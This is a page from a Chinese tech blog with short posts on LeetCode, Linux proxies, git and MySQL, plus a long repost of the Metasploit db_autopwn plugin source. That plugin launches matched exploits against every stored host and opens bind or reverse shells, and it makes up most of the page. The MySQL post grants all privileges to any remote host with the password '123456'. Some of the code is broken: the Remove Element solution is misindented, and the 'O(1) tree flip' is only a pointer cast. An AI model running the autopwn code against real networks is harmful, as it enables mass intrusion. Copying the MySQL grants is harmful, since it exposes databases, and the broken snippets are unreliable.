<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css">
  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Leetcode：Power of Three" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Leetcode：Power of Three/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Leetcode：Power of Three<br>date:2016-03-07 12:52:12<br>这道题的思路我是跪着看完的。。。</p>
<p>要求：</p>
<p>判断给定int n是否为3的幂，并且并不能用循环和递归：</p>
<pre><code>class Solution(object):
    def isPowerOfThree(self, n):
        if n &lt;= 0:
            return False
        return 3**20%n==0
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Leetcode：Power of Three/" data-id="cj0ryfu9e000kc6ot3788uu68" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Linux命令行下的批量替换操作（附命令）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Linux命令行下的批量替换操作（附命令）/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Linux命令行下的批量替换操作（附命令）<br>date:2016-06-12 10:37:39<br>老师让我将dedecms中的特征全部替换掉，要看不出这是dedecms来，首先第一步就是去除底部的『Powered by dedeCMS』。</p>
<p>用到的命令很简单：</p>
<p>find ./ | xargs perl -pi -e ‘s|Powered by.*|<br> /groups/public|g’</p>
<p>首先 find命令查找目录下所有的文件<br>然后运行perl来执行正则替换命令（xargs来辅助输入输出，传递管道参数）</p>
<p>运行一遍后，Powered by.* 就全部替换成<br> 了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Linux命令行下的批量替换操作（附命令）/" data-id="cj0ryfu9h000lc6otrn3cxz03" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Leetcode：Remove Element" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Leetcode：Remove Element/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Leetcode：Remove Element<br>date:2016-03-07 11:39:59<br>要求：<br>给出一个列表he和一个值，将列表中该值的元素全部去掉，并且返回处理后的列表长度，并且不能创建新的列表</p>
<p>思路O(n)：</p>
<p>第一次循环：找出含有value的个数</p>
<p>第二次循环：砍了他们！</p>
<p>返回此时的len(nums)</p>
<pre><code>class Solution(object):
    def removeElement(self, nums, val):
        lenth = len(nums)
        count = 0
        for i in range(0,lenth):
            if nums[i] == val:
                count += 1
        for i in range(0,lenth):
            try:
                while nums[i] == val:
                    del nums[i]
              except:
                break
        return len(nums)
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Leetcode：Remove Element/" data-id="cj0ryfu9i000mc6otgbbu7gl8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Linux 设置代理" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Linux 设置代理/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Linux 设置代理<br>date:2016-07-12 04:51:34<br>一、命令行界面的一般代理设置方法<br>1、在profile文件中设置相关环境变量</p>
<h1 id="vi-etc-profile"><a href="#vi-etc-profile" class="headerlink" title="vi /etc/profile"></a>vi /etc/profile</h1><p>http_proxy=192.168.10.91:3128 # 分别指定http、https、ftp协议使用的代理服务器地址<br>https_proxy=192.168.10.91:3128<br>ftp_proxy=192.168.10.91:3128<br>no_proxy=192.168.10.0. # 访问局域网地址（192.168.20.0/24网段）时不使用代理，可以用逗号分隔多个地址<br>export http_proxy https_proxy ftp_proxy no_proxy<br>保存退出，注销重新登陆系统即可生效。<br>现在代理上网时没有问题了，如果使用的是debian的系统要使用apt-get怎么办？<br>三种方法：<br>1.临时设置让apt-get使用代理<br>直接在命令行下输入export http_proxy=<a href="http://yourproxyaddress:proxyport" target="_blank" rel="external">http://yourproxyaddress:proxyport</a><br>2.永久设置<br>编辑/etc/apt/apt.conf文件，在文件末尾加入<br>Acquire::http::Proxy “<a href="http://yourproxyaddress:proxyport" target="_blank" rel="external">http://yourproxyaddress:proxyport</a><br>有的系统安装时没有apt.conf文件需要手动建立，此方法仅是给apt-get设置代理<br>3.为apt和其他应用程序，如wget设置代理<br>编辑.bashrc文件，在文件末尾添加<br>http_proxy=<a href="http://yourproxyaddress:proxyport" target="_blank" rel="external">http://yourproxyaddress:proxyport</a><br>export http_proxy保存文件，退出重新登录设置生效。</p>
<p>本文出自 “成长全记录” 博客，请务必保留此出处<a href="http://lymrg.blog.51cto.com/1551327/425744" target="_blank" rel="external">http://lymrg.blog.51cto.com/1551327/425744</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Linux 设置代理/" data-id="cj0ryfu9i000nc6otxbr241kw" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Mac 下pymagic 连接终端" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Mac 下pymagic 连接终端/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Mac 下pymagic 连接终端<br>date:2016-05-17 11:34:20<br>pymagic是一款可以由Python操作的硬件，网站上介绍了windows和linux的连接方式，并没有mac版，经过了十几分钟的实验，我找出了mac下连接pymagic的办法：</p>
<p>1.打开终端 进入/dev/目录：</p>
<p>cd /dev</p>
<p>2.ls &gt; ~/1.txt将当前设备名保存至文件</p>
<p>3.插入pymagic，并执行 ls &gt; ~/2.txt</p>
<p>4.比较： diff ~/1.txt ~/2.txt</p>
<p>5.找到tty打头的那个设备号：</p>
<p>ex:   tty.usbmodem1422</p>
<p>6.执行 sudo screen /dev/tty.usbmodem1422<br>就能够使用了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Mac 下pymagic 连接终端/" data-id="cj0ryfu9j000oc6oti1iyxuaj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Mac 下使用sourcetree操作git教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Mac 下使用sourcetree操作git教程/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Mac 下使用sourcetree操作git教程<br>date:2016-03-04 02:51:45<br> SourceTree 是 Windows 和Mac OS X 下免费的 Git 和 Hg 客户端，同时也是Mercurial和Subversion版本控制系统工具。支持创建、克隆、提交、push、pull 和合并等操作。         SourceTree拥有一个精美简洁的界面，大大简化了开发者与代码库之间的Git操作方式，这对于那些不熟悉Git命令的开发者来说非常实用。SourceTree拥有完整的Git功能：通过一个简单的用户界面即可使用所有的Git命令通过一次单击，即可管理所有的Git库，无论是托管的还是本地的通过一次单击，即可进行commit、push、pull、merge等操作一些先进的功能，如补丁处理、rebase、shelve、cherry picking等可以连接到你托管在Bitbucket、Stash、Microsoft TFS或GitHub中的代码库。<br>1.sourcetree的安装：<br>打开应用商店：搜索sourcetree并下载、安装（免费）。<br>2.注册一个git服务（文中以<a href="http://git.oschina.net/为例）" target="_blank" rel="external">http://git.oschina.net/为例）</a><br>打开<a href="http://git.oschina.net/注册并验证，创建或者fork一个项目并打开。" target="_blank" rel="external">http://git.oschina.net/注册并验证，创建或者fork一个项目并打开。</a><br>把git文件的地址记录下来。<br>3.打开sourcetree，点击new<br>填入刚才的地址并选择一个本地目录来储存代码。<br>4.现在你可以在本地目录里面进行开发了，开发完成后，再次打开sourcetree：<br>将files in the working tree 里面的文件拖进index里面 点击工具栏里面的commit，弹出框中再次点击commit后 ，点击绿色的PUSH箭头，这时候你的文件就会成功的上传到git仓库里面咯！<br>5.如果出现error: failed to push some refs to 错误时，是因为本地与远程版本不匹配引起的，这时再次clone一下代码到本地就ok~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Mac 下使用sourcetree操作git教程/" data-id="cj0ryfu9k000pc6otlyzvwa55" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Mysql用户远程连接授权" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Mysql用户远程连接授权/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Mysql用户远程连接授权<br>date:2016-03-15 04:24:35<br>经常遇到即使mysql开启0.0.0.0监听也无法远程连接的情况，下面的代码就是解决这个问题的。</p>
<pre><code># mysql -u root -p
# 允许本地 IP 访问 localhost, 127.0.0.1
# insert into mysql.user(Host,User,Password) values(&apos;localhost&apos;,&apos;shuaishuai&apos;,password(&apos;123456&apos;));
# 允许外网 IP 访问
# insert into mysql.user(Host,User,Password) values(&apos;%&apos;,&apos;shuaishuai&apos;,password(&apos;123456&apos;));
# 刷新授权
# flush privileges;
# 创建数据库

# 授予用户通过外网IP对于数据库的全部权限
# grant all privileges on *.* to &apos;shuaishuai&apos;@&apos;%&apos; identified by &apos;123456&apos;;
# 授予用户在本地服务器对该数据库的全部权限
# grant all privileges on *.* to &apos;shuaishuai&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;
# 刷新权限
# flush privileges;
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Mysql用户远程连接授权/" data-id="cj0ryfu9l000qc6otrgrsvq1p" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Metasploit db_autopwn模块源代码" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/Metasploit db_autopwn模块源代码/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:Metasploit db_autopwn模块源代码<br>date:2016-02-07 11:44:51<br>    #</p>
<pre><code># db_autopwn - stripped from previous db commands and modified into a plugin as autopwn has been
#        pulled from the mainline release.
#
#        Issues/Bugs should go to neinwechter via GitHub
#


module Msf

class Plugin::DBAutopwn &lt; Msf::Plugin
    class DBAutopwnCommandDispatcher
        include Msf::Ui::Console::CommandDispatcher

        #
        # Constants
        #

        PWN_SHOW = 2**0
        PWN_XREF = 2**1
        PWN_PORT = 2**2
        PWN_EXPL = 2**3
        PWN_SING = 2**4
        PWN_SLNT = 2**5
        PWN_VERB = 2**6

        def name
            &quot;db_autopwn&quot;
        end

        def commands
            {
                &quot;db_autopwn&quot; =&gt; &quot;Automatically exploit everything&quot;,
            }
        end

        #
        # Returns true if the db is connected, prints an error and returns
        # false if not.
        #
        # All commands that require an active database should call this before
        # doing anything.
        #
        def active?
            if not framework.db.active
                print_error(&quot;Database not connected&quot;)
                return false
            end
            true
        end

        #
        # A shotgun approach to network-wide exploitation
        # Officially deprecated as of 4.1
        #
        # Forked for those who still want it and understand it&apos;s limitations/issues
        #

        def cmd_db_autopwn(*args)
            return unless active?

            print_error(&quot;&quot;)
            print_error(&quot;Warning: The db_autopwn command is not officially supported and exists only in a branch.&quot;)
            print_error(&quot;         This code is not well maintained, crashes systems, and crashes itself.&quot;)
            print_error(&quot;         Use only if you understand it&apos;s current limitations/issues.&quot;)
            print_error(&quot;         Minimal support and development via neinwechter on GitHub metasploit fork.&quot;)
            print_error(&quot;&quot;)

            stamp = Time.now.to_f
            vcnt  = 0
            rcnt  = 0
            mode  = 0
            code  = :bind
            mjob  = 5
            regx  = nil
            minrank = nil
            maxtime = 120

            port_inc = []
            port_exc = []

            targ_inc = []
            targ_exc = []

            args.push(&quot;-h&quot;) if args.length == 0

            while (arg = args.shift)
                case arg
                when &apos;-t&apos;
                    mode |= PWN_SHOW
                when &apos;-x&apos;
                    mode |= PWN_XREF
                when &apos;-p&apos;
                    mode |= PWN_PORT
                when &apos;-e&apos;
                    mode |= PWN_EXPL
                when &apos;-s&apos;
                    mode |= PWN_SING
                when &apos;-q&apos;
                    mode |= PWN_SLNT
                when &apos;-v&apos;
                    mode |= PWN_VERB
                when &apos;-j&apos;
                    mjob = args.shift.to_i
                when &apos;-r&apos;
                    code = :conn
                when &apos;-b&apos;
                    code = :bind
                when &apos;-I&apos;
                    tmpopt = OptAddressRange.new(&apos;TEMPRANGE&apos;, [ true, &apos;&apos; ])
                    range = args.shift
                    if not tmpopt.valid?(range)
                        print_error(&quot;Invalid range for -I&quot;)
                        return
                    end
                    targ_inc &lt;&lt; Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
                when &apos;-X&apos;
                    tmpopt = OptAddressRange.new(&apos;TEMPRANGE&apos;, [ true, &apos;&apos; ])
                    range = args.shift
                    if not tmpopt.valid?(range)
                        print_error(&quot;Invalid range for -X&quot;)
                        return
                    end
                    targ_exc &lt;&lt; Rex::Socket::RangeWalker.new(tmpopt.normalize(range))
                when &apos;-PI&apos;
                    port_inc = Rex::Socket.portspec_to_portlist(args.shift)
                when &apos;-PX&apos;
                    port_exc = Rex::Socket.portspec_to_portlist(args.shift)
                when &apos;-m&apos;
                    regx = args.shift
                when &apos;-R&apos;
                    minrank = args.shift
                when &apos;-T&apos;
                    maxtime = args.shift.to_f
                when &apos;-h&apos;,&apos;--help&apos;
                    print_status(&quot;Usage: db_autopwn [options]&quot;)
                    print_line(&quot;\t-h          Display this help text&quot;)
                    print_line(&quot;\t-t          Show all matching exploit modules&quot;)
                    print_line(&quot;\t-x          Select modules based on vulnerability references&quot;)
                    print_line(&quot;\t-p          Select modules based on open ports&quot;)
                    print_line(&quot;\t-e          Launch exploits against all matched targets&quot;)
#                    print_line(&quot;\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)&quot;)
                    print_line(&quot;\t-r          Use a reverse connect shell&quot;)
                    print_line(&quot;\t-b          Use a bind shell on a random port (default)&quot;)
                    print_line(&quot;\t-q          Disable exploit module output&quot;)
                    print_line(&quot;\t-R  [rank]  Only run modules with a minimal rank&quot;)
                    print_line(&quot;\t-I  [range] Only exploit hosts inside this range&quot;)
                    print_line(&quot;\t-X  [range] Always exclude hosts inside this range&quot;)
                    print_line(&quot;\t-PI [range] Only exploit hosts with these ports open&quot;)
                    print_line(&quot;\t-PX [range] Always exclude hosts with these ports open&quot;)
                    print_line(&quot;\t-m  [regex] Only run modules whose name matches the regex&quot;)
                    print_line(&quot;\t-T  [secs]  Maximum runtime for any exploit in seconds&quot;)
                    print_line(&quot;&quot;)
                    return
                end
            end

            minrank = minrank || framework.datastore[&apos;MinimumRank&apos;] || &apos;manual&apos;
            if ! RankingName.values.include?(minrank)
                print_error(&quot;MinimumRank invalid!  Possible values are (#{RankingName.sort.map{|r|r[1]}.join(&quot;|&quot;)})&quot;)
                wlog(&quot;MinimumRank invalid, ignoring&quot;, &apos;core&apos;, LEV_0)
                return
            else
                minrank = RankingName.invert[minrank]
            end

            # Default to quiet mode
            if (mode &amp; PWN_VERB == 0)
                mode |= PWN_SLNT
            end

            matches    = {}
            refmatches = {}

            # Pre-allocate a list of references and ports for all exploits
            mrefs  = {}
            mports = {}
            mservs = {}

            # A list of jobs we spawned and need to wait for
            autopwn_jobs = []

            [ [framework.exploits, &apos;exploit&apos; ], [ framework.auxiliary, &apos;auxiliary&apos; ] ].each do |mtype|
                mtype[0].each_module do |modname, mod|
                    o = mod.new

                    if(mode &amp; PWN_XREF != 0)
                        o.references.each do |r|
                            next if r.ctx_id == &apos;URL&apos;
                            ref = r.ctx_id + &quot;-&quot; + r.ctx_val
                            ref.upcase!

                            mrefs[ref] ||= {}
                            mrefs[ref][o.fullname] = o
                        end
                    end

                    if(mode &amp; PWN_PORT != 0)
                        if(o.datastore[&apos;RPORT&apos;])
                            rport = o.datastore[&apos;RPORT&apos;]
                            mports[rport.to_i] ||= {}
                            mports[rport.to_i][o.fullname] = o
                        end

                        if(o.respond_to?(&apos;autofilter_ports&apos;))
                            o.autofilter_ports.each do |rport|
                                mports[rport.to_i] ||= {}
                                mports[rport.to_i][o.fullname] = o
                            end
                        end

                        if(o.respond_to?(&apos;autofilter_services&apos;))
                            o.autofilter_services.each do |serv|
                                mservs[serv] ||= {}
                                mservs[serv][o.fullname] = o
                            end
                        end
                    end
                end
            end


            begin

            framework.db.hosts.each do |host|
                xhost = host.address
                next if (targ_inc.length &gt; 0 and not range_include?(targ_inc, xhost))
                next if (targ_exc.length &gt; 0 and range_include?(targ_exc, xhost))

                if(mode &amp; PWN_VERB != 0)
                    print_status(&quot;Scanning #{xhost} for matching exploit modules...&quot;)
                end

                #
                # Match based on vulnerability references
                #
                if (mode &amp; PWN_XREF != 0)

                    host.vulns.each do |vuln|

                        # Faster to handle these here
                        serv = vuln.service
                        xport = xprot = nil

                        if(serv)
                            xport = serv.port
                            xprot = serv.proto
                        end

                        vuln.refs.each do |ref|
                            mods = mrefs[ref.name.upcase] || {}
                            mods.each_key do |modname|
                                mod = mods[modname]
                                next if minrank and minrank &gt; mod.rank
                                next if (regx and mod.fullname !~ /#{regx}/)

                                if(xport)
                                    next if (port_inc.length &gt; 0 and not port_inc.include?(serv.port.to_i))
                                    next if (port_exc.length &gt; 0 and port_exc.include?(serv.port.to_i))
                                else
                                    if(mod.datastore[&apos;RPORT&apos;])
                                        next if (port_inc.length &gt; 0 and not port_inc.include?(mod.datastore[&apos;RPORT&apos;].to_i))
                                        next if (port_exc.length &gt; 0 and port_exc.include?(mod.datastore[&apos;RPORT&apos;].to_i))
                                    end
                                end

                                next if (regx and mod.fullname !~ /#{regx}/)

                                mod.datastore[&apos;RPORT&apos;] = xport if xport
                                mod.datastore[&apos;RHOST&apos;] = xhost

                                filtered = false
                                begin
                                    ::Timeout.timeout(2, ::RuntimeError) do
                                        filtered = true if not mod.autofilter()
                                    end
                                rescue ::Interrupt
                                    raise $!
                                rescue ::Timeout::Error
                                    filtered = true
                                rescue ::Exception
                                    filtered = true
                                end
                                next if filtered

                                matches[[xport,xprot,xhost,mod.fullname]]=true
                                refmatches[[xport,xprot,xhost,mod.fullname]] ||= []
                                refmatches[[xport,xprot,xhost,mod.fullname]] &lt;&lt; ref.name
                            end
                        end
                    end
                end

                #
                # Match based on open ports
                #
                if (mode &amp; PWN_PORT != 0)
                    host.services.each do |serv|
                        next if not serv.host
                        next if (serv.state != ServiceState::Open)

                        xport = serv.port.to_i
                        xprot = serv.proto
                        xname = serv.name

                        next if xport == 0

                        next if (port_inc.length &gt; 0 and not port_inc.include?(xport))
                        next if (port_exc.length &gt; 0 and port_exc.include?(xport))

                        mods = mports[xport.to_i] || {}

                        mods.each_key do |modname|
                            mod = mods[modname]
                            next if minrank and minrank &gt; mod.rank
                            next if (regx and mod.fullname !~ /#{regx}/)
                            mod.datastore[&apos;RPORT&apos;] = xport
                            mod.datastore[&apos;RHOST&apos;] = xhost

                            filtered = false
                            begin
                                ::Timeout.timeout(2, ::RuntimeError) do
                                    filtered = true if not mod.autofilter()
                                end
                            rescue ::Interrupt
                                raise $!
                            rescue ::Exception
                                filtered = true
                            end

                            next if filtered
                            matches[[xport,xprot,xhost,mod.fullname]]=true
                        end

                        mods = mservs[xname] || {}
                        mods.each_key do |modname|
                            mod = mods[modname]
                            next if minrank and minrank &gt; mod.rank
                            next if (regx and mod.fullname !~ /#{regx}/)
                            mod.datastore[&apos;RPORT&apos;] = xport
                            mod.datastore[&apos;RHOST&apos;] = xhost

                            filtered = false
                            begin
                                ::Timeout.timeout(2, ::RuntimeError) do
                                    filtered = true if not mod.autofilter()
                                end
                            rescue ::Interrupt
                                raise $!
                            rescue ::Exception
                                filtered = true
                            end

                            next if filtered
                            matches[[xport,xprot,xhost,mod.fullname]]=true
                        end
                    end
                end
            end

            rescue ::Exception =&gt; e
                print_status(&quot;ERROR: #{e.class} #{e} #{e.backtrace}&quot;)
                return
            end

            if (mode &amp; PWN_SHOW != 0)
                print_status(&quot;Analysis completed in #{(Time.now.to_f - stamp).to_i} seconds (#{vcnt} vulns / #{rcnt} refs)&quot;)
                print_status(&quot;&quot;)
                print_status(&quot;=&quot; * 80)
                print_status(&quot; &quot; * 28 + &quot;Matching Exploit Modules&quot;)
                print_status(&quot;=&quot; * 80)

                matches.each_key do |xref|
                    mod = nil
                    if ((mod = framework.modules.create(xref[3])) == nil)
                        print_status(&quot;Failed to initialize #{xref[3]}&quot;)
                        next
                    end

                    if (mode &amp; PWN_SHOW != 0)
                        tport = xref[0] || mod.datastore[&apos;RPORT&apos;]
                        if(refmatches[xref])
                            print_status(&quot;  #{xref[2]}:#{tport}  #{xref[3]}  (#{refmatches[xref].join(&quot;, &quot;)})&quot;)
                        else
                            print_status(&quot;  #{xref[2]}:#{tport}  #{xref[3]}  (port match)&quot;)
                        end
                    end

                end
                print_status(&quot;=&quot; * 80)
                print_status(&quot;&quot;)
                print_status(&quot;&quot;)
            end

            ilog(&quot;db_autopwn: Matched #{matches.length} modules&quot;)

            idx = 0
            matches.each_key do |xref|

                idx += 1

                begin
                    mod = nil

                    if ((mod = framework.modules.create(xref[3])) == nil)
                        print_status(&quot;Failed to initialize #{xref[3]}&quot;)
                        next
                    end

                    #
                    # The code is just a proof-of-concept and will be expanded in the future
                    #
                    if (mode &amp; PWN_EXPL != 0)

                        mod.datastore[&apos;RHOST&apos;] = xref[2]

                        if(xref[0])
                            mod.datastore[&apos;RPORT&apos;] = xref[0].to_s
                        end

                        if (code == :bind)
                            mod.datastore[&apos;LPORT&apos;]   = (rand(0x8fff) + 4000).to_s
                            if(mod.fullname =~ /\/windows\//)
                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;windows/meterpreter/bind_tcp&apos;
                            else
                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;generic/shell_bind_tcp&apos;
                            end
                        end

                        if (code == :conn)
                            mod.datastore[&apos;LHOST&apos;]   =     Rex::Socket.source_address(xref[2])
                            mod.datastore[&apos;LPORT&apos;]   =     (rand(0x8fff) + 4000).to_s

                            if (mod.datastore[&apos;LHOST&apos;] == &apos;127.0.0.1&apos;)
                                print_status(&quot;Failed to determine listener address for target #{xref[2]}...&quot;)
                                next
                            end

                            if(mod.fullname =~ /\/windows\//)
                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;windows/meterpreter/reverse_tcp&apos;
                            else
                                mod.datastore[&apos;PAYLOAD&apos;] = &apos;generic/shell_reverse_tcp&apos;
                            end
                        end


                        if(framework.jobs.keys.length &gt;= mjob)
                            print_status(&quot;Job limit reached, waiting on modules to finish...&quot;)
                            while(framework.jobs.keys.length &gt;= mjob)
                                ::IO.select(nil, nil, nil, 0.25)
                            end
                        end

                        print_status(&quot;(#{idx}/#{matches.length} [#{framework.sessions.length} sessions]): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore[&apos;RPORT&apos;]}...&quot;)

                        autopwn_jobs &lt;&lt; framework.threads.spawn(&quot;AutoPwnJob#{xref[3]}&quot;, false, mod) do |xmod|
                            begin
                            stime = Time.now.to_f
                            ::Timeout.timeout(maxtime) do
                                    inp = (mode &amp; PWN_SLNT != 0) ? nil : driver.input
                                    out = (mode &amp; PWN_SLNT != 0) ? nil : driver.output

                                    case xmod.type
                                    when MODULE_EXPLOIT
                                        xmod.exploit_simple(
                                            &apos;Payload&apos;        =&gt; xmod.datastore[&apos;PAYLOAD&apos;],
                                            &apos;LocalInput&apos;     =&gt; inp,
                                            &apos;LocalOutput&apos;    =&gt; out,
                                            &apos;RunAsJob&apos;       =&gt; false)
                                    when MODULE_AUX
                                        xmod.run_simple(
                                            &apos;LocalInput&apos;     =&gt; inp,
                                            &apos;LocalOutput&apos;    =&gt; out,
                                            &apos;RunAsJob&apos;       =&gt; false)
                                    end
                                end

                            rescue ::Timeout::Error
                                print_status(&quot; &gt;&gt; autopwn module timeout from #{xmod.fullname} after #{Time.now.to_f - stime} seconds&quot;)
                            rescue ::Exception
                                print_status(&quot; &gt;&gt; autopwn exception during launch from #{xmod.fullname}: #{$!} &quot;)
                            end
                        end
                    end

                rescue ::Interrupt
                    raise $!

                rescue ::Exception
                    print_status(&quot; &gt;&gt; autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}&quot;)
                end
            end

            # Wait on all the jobs we just spawned
            while (not autopwn_jobs.empty?)
                # All running jobs are stored in framework.jobs.  If it&apos;s
                # not in this list, it must have completed.
                autopwn_jobs.delete_if { |j| not j.alive? }

                print_status(&quot;(#{matches.length}/#{matches.length} [#{framework.sessions.length} sessions]): Waiting on #{autopwn_jobs.length} launched modules to finish execution...&quot;)
                ::IO.select(nil, nil, nil, 5.0)
            end

            if (mode &amp; PWN_SHOW != 0 and mode &amp; PWN_EXPL != 0)
                print_status(&quot;The autopwn command has completed with #{framework.sessions.length} sessions&quot;)
                if(framework.sessions.length &gt; 0)
                    print_status(&quot;Enter sessions -i [ID] to interact with a given session ID&quot;)
                    print_status(&quot;&quot;)
                    print_status(&quot;=&quot; * 80)
                    driver.run_single(&quot;sessions -l -v&quot;)
                    print_status(&quot;=&quot; * 80)
                end
            end
            print_line(&quot;&quot;)
        # EOM
        end










##############################
##############################

    end

    def initialize(framework, opts)
        super
        add_console_dispatcher(DBAutopwnCommandDispatcher)
    end

    def cleanup
        remove_console_dispatcher(&apos;db_autopwn&apos;)
    end

    def name
        &quot;db_autopwn&quot;
    end

    def desc
        &quot;Automatically exploit everything&quot;
    end

end
end
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/Metasploit db_autopwn模块源代码/" data-id="cj0ryfu9n000rc6otq0pidkj1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-O(1)实现二叉树翻转" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/O(1)实现二叉树翻转/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>title:O(1)实现二叉树翻转<br>date:2016-01-25 12:50:00</p>
<pre><code>#include &lt;stdio.h&gt;
struct tree
{
    struct tree* left;
    struct tree* right;
    int data;
}*head;
struct treeT
{
    struct tree* right;
    struct tree* left;
    int data;
};
int main()
{
    head = new tree;
    head-&gt;left = new tree;
    head-&gt;left-&gt;data = 123;

    head-&gt;right = new tree;
    head-&gt;right-&gt;data = 456;
    treeT* x = (treeT*)head;
    printf(&quot;right :%d&quot;,x-&gt;right-&gt;data);
}
</code></pre><p>PS:之前在知乎上看到的，找了半晚上没有找到那个帖子，作者看到请联系我。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/03/26/O(1)实现二叉树翻转/" data-id="cj0ryfu9o000sc6otli4i05oe" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PHP mysqli连接特别慢的情况解决" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/03/26/PHP mysqli连接特别慢的情况解决/" class="article-date">
  <time datetime="2017-03-26T07:32:46.000Z" itemprop="datePublished">2017-03-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
